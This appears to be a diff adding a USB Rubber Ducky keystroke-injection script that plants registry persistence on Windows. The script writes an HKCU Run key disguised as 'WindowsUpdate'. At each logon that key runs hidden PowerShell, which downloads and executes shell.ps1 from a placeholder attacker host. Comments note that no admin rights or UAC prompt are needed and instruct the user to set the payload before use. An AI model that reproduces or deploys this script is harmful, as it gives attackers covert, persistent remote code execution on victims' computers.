@@ -1,0 +1,7 @@
+REM Add HKCU Run key persistence — survives reboot, no admin needed
+REM CHANGE: payload path/command before use
+REM Uses HKCU (current user) — no UAC needed
+GUI r
+DELAY 800
+STRING cmd /k "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d \"powershell -nop -w hidden -c IEX(IWR http://ATTACKER_IP:8080/shell.ps1 -UseBasicParsing)\" /f & echo [+] Persistence set"
+ENTER
